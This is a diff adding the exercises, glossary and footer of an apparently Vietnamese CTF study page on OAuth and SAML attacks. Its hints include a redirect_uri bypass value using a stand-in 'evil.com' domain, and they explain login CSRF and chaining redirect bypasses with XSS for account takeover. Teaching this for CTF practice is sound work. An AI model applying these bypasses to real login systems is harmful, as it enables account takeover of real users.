+    <tr><td>❌</td><td>Provider validate redirect_uri + state đúng chuẩn, VÀ SAML Signature validate đúng node — không có lỗ hổng loại này ở đây.</td></tr>
+  </table>
+ </div>
+</section>
+
+<!-- 13 -->
+<section class="block" id="s13">
+ <div class="wrap">
+  <div class="secnum">13 / BÀI TẬP & THUẬT NGỮ</div>
+  <h2>Luyện tập</h2>
+  <p>⭐ <strong>Làm lại:</strong> dựng 1 OAuth provider giả đơn giản (Flask) với validate redirect_uri kiểu
+  <code>startswith</code> (sai), tự tìm biến thể domain né được validate đó.</p>
+  <details><summary>Gợi ý nếu kẹt</summary><code>"https://app.com.evil.com".startswith("https://app.com")</code>
+  trả về <code>True</code> trong Python — đây chính xác là lỗi cần tái tạo.</details>
+
+  <p>⭐⭐ <strong>Đổi 1 biến:</strong> thêm kiểm tra <code>state</code> vào app Flask giả trên, tự thử login CSRF
+  (mục 00/03) để xác nhận bị chặn đúng cách khi có state.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>Dùng <code>secrets.token_urlsafe()</code> sinh state, lưu vào
+  session trước khi redirect, so khớp đúng session đó khi callback về.</details>
+
+  <p>⭐⭐⭐⭐ <strong>Tự nghĩ:</strong> giải thích vì sao lỗ hổng redirect_uri thường cần PHỐI HỢP với 1 lỗ hổng
+  khác (XSS hoặc admin bot) mới thực sự "lấy được" account takeover, trong khi lỗ hổng thiếu <code>state</code>
+  (login CSRF) có thể khai thác ĐƠN ĐỘC mà không cần lỗ hổng nào khác.</p>
+  <details><summary>Gợi ý nếu kẹt</summary>redirect_uri bypass cần code BAY VỀ domain kẻ tấn công — kẻ tấn công
+  phải có cách nào đó khiến NẠN NHÂN bấm link đó (1 kênh truyền link: XSS, admin bot, hoặc gửi trực tiếp);
+  login CSRF ngược lại tự nó ĐÃ LÀ 1 link độc hoàn chỉnh, gửi trực tiếp cho nạn nhân bấm là đủ, không cần
+  thêm lỗ hổng truyền tải nào khác.</details>
+
+  <h2>Thuật ngữ</h2>
+  <table>
+    <tr><td>IdP (Identity Provider)</td><td>Bên xác thực danh tính thật (Google, Okta, hoặc hệ thống SSO nội bộ).</td></tr>
+    <tr><td>SP (Service Provider)</td><td>Chính app bạn đang tấn công, tin tưởng IdP để xác thực user.</td></tr>
+    <tr><td>XSW (XML Signature Wrapping)</td><td>Kỹ thuật chèn thêm node XML giả bên cạnh node đã ký, lợi dụng app đọc nhầm node.</td></tr>
+  </table>
+  <p style="margin-top:16px"><strong>Công cụ:</strong> Burp extension "SAML Raider" (cài qua BApp Store trước
+  ngày thi).</p>
+ </div>
+</section>
+
+</main>
+
+<footer>
+  <div class="wrap">
+    <p>Chỉ dùng cho học tập &amp; thi CTF hợp pháp, trong phạm vi được cấp phép (F-Hacker 2026 Bảng C và tương tự).</p>
+  </div>
+</footer>
+
+<script>
+(function(){
+  "use strict";
+  var btn=document.getElementById("themeBtn");
+  function cur(){var a=document.documentElement.getAttribute("data-theme");if(a)return a;return window.matchMedia("(prefers-color-scheme:dark)").matches?"dark":"light";}
+  btn.addEventListener("click",function(){var n=cur()==="dark"?"light":"dark";document.documentElement.setAttribute("data-theme",n);try{localStorage.setItem("oauth-theme",n);}catch(e){}});
+  try{var s=localStorage.getItem("oauth-theme");if(s)document.documentElement.setAttribute("data-theme",s);}catch(e){}
+})();
+</script>
